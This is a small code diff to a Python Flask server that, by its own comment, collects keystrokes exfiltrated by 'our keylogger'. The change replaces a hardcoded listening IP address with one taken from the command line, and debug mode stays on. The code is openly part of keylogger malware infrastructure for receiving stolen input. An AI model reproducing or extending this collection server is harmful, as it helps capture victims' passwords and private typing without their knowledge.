@@ -4,11 +4,14 @@
 # from our keylogger for exfil of logged keystrokes
 
 import os
+import sys
 from flask import Flask, render_template, request
 
 app = Flask(__name__)
 
 APP_ROOT = os.path.dirname(os.path.abspath(__file__))
+
+IP_ADDRESS = sys.argv[1]
 
 @app.route("/", methods=['GET', 'POST'])
 def upload():
@@ -43,4 +46,4 @@ def upload():
     '''
 
 if __name__ == '__main__':
-    app.run(host='129.21.157.241',port=5000,debug=True)
+    app.run(host=IP_ADDRESS,port=5000,debug=True)
